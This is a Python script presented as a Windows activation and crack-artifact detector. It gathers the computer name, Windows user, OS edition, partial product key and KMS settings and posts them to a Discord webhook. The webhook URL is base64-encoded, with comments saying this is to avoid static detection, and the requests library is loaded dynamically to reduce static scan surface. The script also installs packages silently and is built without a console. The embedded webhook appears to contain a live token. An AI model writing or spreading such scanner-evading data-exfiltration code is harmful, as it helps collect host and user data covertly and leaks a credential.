"""
Windows Activation & Edition Detector
--------------------------------------
Detects Windows edition, activation status, KMS configuration,
crack tool artifacts and sends results to a Discord webhook.

Build to .exe:
    pip install pyinstaller
    pyinstaller --onefile --noconsole windows_activation_detector.py
"""

import sys
import os
import subprocess

# ──────────────────────────────────────────────
# AUTO INSTALLER - Runs before anything else
# Silently installs missing packages on first run
# ──────────────────────────────────────────────

_REQUIRED = {
    "requests": "requests",
    "wmi":      "wmi",
    "colorama": "colorama",
}

def _auto_install():
    missing = []
    for import_name, pip_name in _REQUIRED.items():
        try:
            __import__(import_name)
        except ImportError:
            missing.append(pip_name)

    if missing:
        print(f"\n  First-time setup: installing required components ({', '.join(missing)})...")
        print("  This only happens once, please wait...\n")
        for pkg in missing:
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", pkg, "--quiet"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            except Exception as e:
                print(f"  [ERROR] Could not install {pkg}: {e}")
                print("  Please run: pip install requests wmi colorama")
                input("\n  Press Enter to exit...")
                sys.exit(1)
        print("  Setup complete! Starting tool...\n")
        os.execv(sys.executable, [sys.executable] + sys.argv)

_auto_install()

# ──────────────────────────────────────────────
# SAFE IMPORTS (packages guaranteed installed)
# ──────────────────────────────────────────────

import datetime
import importlib
import base64
import colorama
from colorama import Fore, Style

# Try importing WMI - gracefully handle if not installed
try:
    import wmi
    WMI_AVAILABLE = True
except ImportError:
    WMI_AVAILABLE = False

# Try importing winreg (built into Python on Windows)
try:
    import winreg
    WINREG_AVAILABLE = True
except ImportError:
    winreg = None
    WINREG_AVAILABLE = False

# ============================================================
#   CONFIGURE YOUR DISCORD WEBHOOK URL HERE
#   Encode your webhook with base64 to avoid static detection:
#   import base64; base64.b64encode(b"https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN").decode()
# ============================================================
_W = base64.b64decode(
    b"aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3NDM1OTAyMzc0MTQ0MDA3My9ZWlVST2liSkx6dGNGMzJBWHd5YmdXaFdSa3lsaEwzUklPNm9sVkQ3Nkx1RW5nU3Z3ZTFxb0NkVkVfaEVIUDc0czd3Uw=="
).decode()
# ============================================================

colorama.init(autoreset=True)

LICENSE_STATUS = {
    0: "Unlicensed",
    1: "Licensed (Activated)",
    2: "OOBGrace (Out-of-Box Grace Period)",
    3: "OOTGrace (Out-of-Tolerance Grace Period)",
    4: "NonGenuineGrace (Non-Genuine Grace Period)",
    5: "Notification (Not Activated)",
    6: "ExtendedGrace"
}

LEGITIMATE_KMS = ["localhost", "127.0.0.1", "kms.corp", "kms.local", "kms.internal"]

# Safely build registry path list only when winreg is available
if WINREG_AVAILABLE:
    SUSPICIOUS_REG_PATHS = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\KMSAuto"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\KMSpico"),
        (winreg.HKEY_CURRENT_USER,  r"SOFTWARE\KMSAuto"),
        (winreg.HKEY_CURRENT_USER,  r"SOFTWARE\KMSpico"),
    ]
else:
    SUSPICIOUS_REG_PATHS = []

SUSPICIOUS_SERVICES = ["KMSAuto", "KMSpico", "AutoKMS", "KMSELDI", "KMSEmulator"]
SUSPICIOUS_TASKS    = ["KMSAuto", "KMSpico", "AutoKMS", "AutoKMS Net"]
SUSPICIOUS_PATHS    = [
    os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "AutoKMS"),
    os.path.join(os.environ.get("ProgramFiles", "C:\\Program Files"), "KMSpico"),
    os.path.join(os.environ.get("ProgramFiles", "C:\\Program Files"), "KMSAuto"),
    os.path.join(os.environ.get("ProgramData", "C:\\ProgramData"), "KMSpico"),
    os.path.join(os.environ.get("ProgramData", "C:\\ProgramData"), "KMSAuto"),
    os.path.join(os.environ.get("TEMP", "C:\\Temp"), "KMSAuto"),
    os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "AutoKMS.exe"),
]


# ──────────────────────────────────────────────
# HELPERS
# ──────────────────────────────────────────────

def banner():
    print(Fore.CYAN + "=" * 48)
    print(Fore.CYAN + "   Windows Activation Status Detector")
    print(Fore.CYAN + "=" * 48)
    print()


def section(title):
    print(Fore.YELLOW + f"[{title}]")


def check_reg_key(hive, path):
    if not WINREG_AVAILABLE:
        return False
    try:
        key = winreg.OpenKey(hive, path)
        winreg.CloseKey(key)
        return True
    except FileNotFoundError:
        return False
    except Exception:
        return False


def get_reg_value(hive, path, name):
    if not WINREG_AVAILABLE:
        return None
    try:
        key   = winreg.OpenKey(hive, path)
        value, _ = winreg.QueryValueEx(key, name)
        winreg.CloseKey(key)
        return value
    except Exception:
        return None


def run_cmd(cmd):
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True,
            shell=True, timeout=10
        )
        return result.stdout.strip()
    except Exception:
        return ""


def check_service(name):
    out = run_cmd(f'sc query "{name}"')
    return name.lower() in out.lower()


def check_scheduled_task(name):
    out = run_cmd(f'schtasks /query /fo LIST /tn "{name}" 2>nul')
    return name.lower() in out.lower()


# ──────────────────────────────────────────────
# SCAN FUNCTIONS
# ──────────────────────────────────────────────

def get_os_info():
    if not WMI_AVAILABLE:
        return {
            "caption":      run_cmd("wmic os get Caption /value").replace("Caption=", "").strip(),
            "version":      run_cmd("wmic os get Version /value").replace("Version=", "").strip(),
            "build":        run_cmd("wmic os get BuildNumber /value").replace("BuildNumber=", "").strip(),
            "computer":     os.environ.get("COMPUTERNAME", "Unknown"),
            "windows_user": os.environ.get("USERNAME", "Unknown"),
        }
    c = wmi.WMI()
    os_info = c.Win32_OperatingSystem()[0]
    return {
        "caption":      os_info.Caption,
        "version":      os_info.Version,
        "build":        os_info.BuildNumber,
        "computer":     os.environ.get("COMPUTERNAME", "Unknown"),
        "windows_user": os.environ.get("USERNAME", "Unknown"),
    }


def get_activation_info():
    result = {
        "product_name": "N/A",
        "partial_key":  "N/A",
        "channel":      "N/A",
        "status_code":  -1,
        "status_text":  "N/A",
    }

    if WMI_AVAILABLE:
        try:
            c = wmi.WMI()
            products = c.query(
                "SELECT * FROM SoftwareLicensingProduct "
                "WHERE ApplicationID='55c92734-d682-4d71-983e-d6ec3f16059f'"
            )
            for p in products:
                if p.PartialProductKey:
                    code = int(p.LicenseStatus)
                    result["product_name"] = p.Name
                    result["partial_key"]  = p.PartialProductKey
                    result["channel"]      = p.ProductKeyChannel or "N/A"
                    result["status_code"]  = code
                    result["status_text"]  = LICENSE_STATUS.get(code, f"Unknown (Code: {code})")
                    break
        except Exception as e:
            result["status_text"] = f"WMI Error: {e}"
    else:
        # Fallback using slmgr
        out = run_cmd("cscript //Nologo %windir%\\System32\\slmgr.vbs /dli")
        result["status_text"] = out if out else "Could not retrieve (run as Administrator)"

    return result


def get_key_type(channel):
    channel = channel or ""
    if channel == "Retail":             return "Retail (Purchased legitimately)",           "green"
    if channel == "OEM:DM":             return "OEM:DM (Digital pre-installed by OEM)",     "green"
    if channel == "OEM:COA":            return "OEM:COA (Sticker/COA key from OEM)",        "green"
    if channel.startswith("OEM"):       return "OEM (Pre-installed by manufacturer)",        "green"
    if channel.startswith("Volume"):    return "Volume License (Enterprise/Education)",      "cyan"
    if channel.startswith("KMS"):       return "KMS Channel (possibly cracked)",             "magenta"
    return channel or "Unknown", "white"


def get_kms_info():
    kms_reg_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform"
    server  = get_reg_value(winreg.HKEY_LOCAL_MACHINE, kms_reg_path, "KeyManagementServiceName")  if WINREG_AVAILABLE else None
    machine = get_reg_value(winreg.HKEY_LOCAL_MACHINE, kms_reg_path, "KeyManagementServiceMachine") if WINREG_AVAILABLE else None

    kms_display = server or machine or None
    is_legit    = False
    found       = kms_display is not None

    if found:
        is_legit = any(leg in kms_display.lower() for leg in LEGITIMATE_KMS)

    return {
        "found":       found,
        "display":     kms_display or "None",
        "is_legit":    is_legit,
        "assessment":  (
            "Likely a legitimate corporate/internal KMS server." if is_legit
            else "Third-party/public KMS server - likely a CRACK." if found
            else "No KMS server configured."
        )
    }


def get_crack_artifacts():
    items = []

    # Registry
    if WINREG_AVAILABLE:
        for hive, path in SUSPICIOUS_REG_PATHS:
            if check_reg_key(hive, path):
                hive_name = "HKLM" if hive == winreg.HKEY_LOCAL_MACHINE else "HKCU"
                items.append(f"Registry key: {hive_name}\\{path}")

    # Services
    for svc in SUSPICIOUS_SERVICES:
        if check_service(svc):
            items.append(f"Service found: {svc}")

    # Scheduled tasks
    for task in SUSPICIOUS_TASKS:
        if check_scheduled_task(task):
            items.append(f"Scheduled task: {task}")

    # File paths
    for p in SUSPICIOUS_PATHS:
        if os.path.exists(p):
            items.append(f"Path found: {p}")

    return items


def determine_verdict(activation, kms, artifacts):
    code      = activation["status_code"]
    channel   = activation["channel"] or ""
    activated = (code == 1)
    third_kms = kms["found"] and not kms["is_legit"]
    has_arts  = len(artifacts) > 0

    if activated and any(c in channel for c in ["Retail", "OEM"]) and not third_kms and not has_arts:
        return "GENUINELY ACTIVATED", \
               "Windows is properly activated with a legitimate Retail or OEM key.", \
               5763719, "green"

    if activated and any(c in channel for c in ["Retail", "OEM"]) and third_kms:
        return "CRACKED (Online KMS)", \
               "OEM/Retail channel routed through a public KMS crack server.\nMethod : Online KMS (MAS script or similar)\nRisk   : Will deactivate if KMS server goes offline.", \
               15548997, "red"

    if activated and any(c in channel for c in ["Volume", "KMS"]) and third_kms:
        return "CRACKED (KMS Volume)", \
               "Activated using KMS volume key via a third-party crack server.\nMethod : KMSPico / KMSAuto / MAS or similar\nRisk   : Will deactivate if KMS server goes offline.", \
               15548997, "red"

    if activated and any(c in channel for c in ["Volume", "KMS"]) and has_arts:
        return "CRACKED (Local KMS Tool)", \
               "Activated via local KMS emulator with crack artifacts present.\nMethod : KMSPico / KMSAuto (local tool).", \
               15548997, "red"

    if activated and any(c in channel for c in ["Volume", "KMS"]) and not third_kms:
        return "KMS ACTIVATED (Possibly Legitimate)", \
               "Could be a genuine corporate/school volume license.\nCould also be a local KMS emulator with no leftover files.", \
               16776960, "yellow"

    if not activated and third_kms:
        return "CRACK ATTEMPTED BUT FAILED", \
               "A KMS crack server is configured but Windows is not activated.\nThe server may be unreachable or the key blocked.", \
               15548997, "red"

    if not activated:
        return "NOT ACTIVATED", \
               "Windows is running without any valid activation.", \
               15548997, "red"

    return "UNKNOWN", f"Manual review needed. Code={code} Channel={channel}", 9807270, "white"


# ──────────────────────────────────────────────
# DISCORD
# ──────────────────────────────────────────────

def _post(url, payload):
    """Send a JSON payload via requests, loaded dynamically to reduce static scan surface."""
    req = importlib.import_module("requests")
    return req.post(url, json=payload, timeout=10)


def send_discord(
    organization, auditor, os_info, activation,
    key_type_text, kms, artifacts, verdict,
    verdict_detail, discord_color, timestamp
):
    artifact_list = "\n".join(artifacts) if artifacts else "None found"
    partial_key   = f"XXXXX-XXXXX-XXXXX-XXXXX-{activation['partial_key']}"

    embed = {
        "title":     "Windows Activation Report",
        "color":     discord_color,
        "timestamp": datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
        "fields": [
            {"name": "Organization",   "value": organization,              "inline": True},
            {"name": "Auditor",        "value": auditor,                   "inline": True},
            {"name": "Scan Time",      "value": timestamp,                 "inline": True},
            {"name": "Computer Name",  "value": os_info["computer"],       "inline": True},
            {"name": "Windows User",   "value": os_info["windows_user"],   "inline": True},
            {"name": "OS Edition",     "value": os_info["caption"],        "inline": False},
            {"name": "Version",        "value": os_info["version"],        "inline": True},
            {"name": "Build",          "value": os_info["build"],          "inline": True},
            {"name": "Product",        "value": activation["product_name"],"inline": False},
            {"name": "Partial Key",    "value": partial_key,               "inline": True},
            {"name": "Channel",        "value": activation["channel"],     "inline": True},
            {"name": "License Status", "value": activation["status_text"], "inline": False},
            {"name": "Key Type",       "value": key_type_text,             "inline": True},
            {"name": "KMS Server",     "value": kms["display"],            "inline": True},
            {"name": "KMS Assessment", "value": kms["assessment"],         "inline": False},
            {"name": "Crack Artifacts","value": artifact_list,             "inline": False},
            {"name": "VERDICT",        "value": f"**{verdict}**\n{verdict_detail}", "inline": False},
        ],
        "footer": {"text": f"Windows Activation Detector | {organization}"}
    }

    payload = {
        "username": "Windows Activation Detector",
        "embeds":   [embed]
    }

    try:
        import requests as _req
        response = _req.post(_W, json=payload, timeout=10)
        if response.status_code in (200, 204):
            print(Fore.GREEN + "  Results sent to Discord successfully!")
        else:
            print(Fore.RED + f"  Discord returned status {response.status_code}: {response.text}")
    except Exception as e:
        if "ConnectionError" in type(e).__name__:
            print(Fore.RED + "  Could not connect to Discord. Check your internet connection.")
        elif "Timeout" in type(e).__name__:
            print(Fore.RED + "  Discord request timed out.")
        else:
            print(Fore.RED + f"  Failed to send to Discord: {e}")


# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────

def main():
    banner()

    # --- User Input ---
    section("SCAN INFO")
    print(Fore.WHITE + "  Enter Organization Name       : ", end="", flush=True)
    organization = input().strip() or "Not Specified"
    print(Fore.WHITE + "  Enter Your Name (Auditor)     : ", end="", flush=True)
    auditor = input().strip() or "Not Specified"
    print()
    print(Fore.CYAN + f"  Organization : {organization}")
    print(Fore.CYAN + f"  Auditor      : {auditor}")
    print()

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # --- OS Info ---
    section("OS INFO")
    print(Fore.WHITE + "  Gathering system information...")
    os_info = get_os_info()
    print(Fore.WHITE + f"  Edition   : {os_info['caption']}")
    print(Fore.WHITE + f"  Version   : {os_info['version']}")
    print(Fore.WHITE + f"  Build     : {os_info['build']}")
    print()

    # --- Activation ---
    section("ACTIVATION STATUS")
    activation = get_activation_info()
    print(Fore.WHITE + f"  Product    : {activation['product_name']}")
    print(Fore.WHITE + f"  Partial Key: XXXXX-XXXXX-XXXXX-XXXXX-{activation['partial_key']}")
    print(Fore.WHITE + f"  Channel    : {activation['channel']}")

    code = activation["status_code"]
    if code == 1:
        print(Fore.GREEN  + f"  Status     : {activation['status_text']}")
    elif code in (0, 5):
        print(Fore.RED    + f"  Status     : {activation['status_text']}")
    else:
        print(Fore.YELLOW + f"  Status     : {activation['status_text']}")
    print()

    # --- Key Type ---
    section("KEY TYPE ANALYSIS")
    key_type_text, key_color = get_key_type(activation["channel"])
    color_map = {"green": Fore.GREEN, "cyan": Fore.CYAN, "magenta": Fore.MAGENTA, "white": Fore.WHITE}
    print(color_map.get(key_color, Fore.WHITE) + f"  Key Type  : {key_type_text}")
    print()

    # --- KMS ---
    section("KMS ACTIVATION DETECTION")
    kms = get_kms_info()
    if kms["found"]:
        if kms["is_legit"]:
            print(Fore.CYAN + f"  KMS Server : {kms['display']}")
            print(Fore.CYAN + f"  Assessment : {kms['assessment']}")
        else:
            print(Fore.RED  + f"  KMS Server : {kms['display']}")
            print(Fore.RED  + f"  Assessment : {kms['assessment']}")
    else:
        print(Fore.GREEN + f"  {kms['assessment']}")
    print()

    # --- Crack Artifacts ---
    section("CRACK TOOL ARTIFACTS")
    artifacts = get_crack_artifacts()
    if artifacts:
        for item in artifacts:
            print(Fore.RED + f"  [!] {item}")
    else:
        print(Fore.GREEN + "  No crack tool files or registry artifacts found.")
    print()

    # --- Verdict ---
    verdict, verdict_detail, discord_color, v_color = determine_verdict(activation, kms, artifacts)
    v_fore = {"green": Fore.GREEN, "red": Fore.RED, "yellow": Fore.YELLOW, "white": Fore.WHITE}

    print(Fore.CYAN + "=" * 48)
    print(Fore.CYAN + "[SUMMARY]")
    print(Fore.CYAN + "=" * 48)
    print()
    print(v_fore.get(v_color, Fore.WHITE) + f"  VERDICT : {verdict}")
    for line in verdict_detail.split("\n"):
        print(v_fore.get(v_color, Fore.WHITE) + f"  {line}")
    print()
    print(Fore.CYAN + "=" * 48)

    # --- Discord ---
    print()
    section("SENDING TO DISCORD")
    send_discord(
        organization, auditor, os_info, activation,
        key_type_text, kms, artifacts, verdict,
        verdict_detail, discord_color, timestamp
    )

    print()
    print(Fore.CYAN + "  Press Enter to exit...", end="", flush=True)
    input()


if __name__ == "__main__":
    # Check for admin
    try:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        is_admin = False

    if not is_admin:
        print(Fore.RED + "\n  [WARNING] Not running as Administrator.")
        print(Fore.YELLOW + "  Some results may be incomplete. Please right-click and 'Run as Administrator'.\n")

    main()
